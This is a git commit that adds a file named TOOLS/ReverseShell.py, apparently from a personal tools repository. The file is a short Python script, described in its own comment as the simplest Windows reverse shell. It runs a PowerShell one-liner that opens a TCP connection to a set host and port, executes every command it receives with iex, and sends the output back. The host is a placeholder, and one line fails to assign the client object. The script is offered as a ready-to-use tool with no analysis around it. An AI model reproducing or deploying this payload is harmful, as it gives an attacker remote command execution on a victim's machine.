96023170b4369a290939f12610026240f1a4c02e
Steven <111704953+I-DoNt-LiKe-Micro-Soft@users.noreply.github.com>
2023-04-25 17:17:39 +0100

    Add files via upload

---
+++ TOOLS/ReverseShell.py
@@ -0,0 +1,5 @@
+from subprocess import run
+
+#-The simplest windows python reverseshell
+
+run("powershell.exe New-Object System.Net.Sockets.TCPClient('127.0.0.1', 0);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex \". { $data } 2>&1\" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",shell=True)
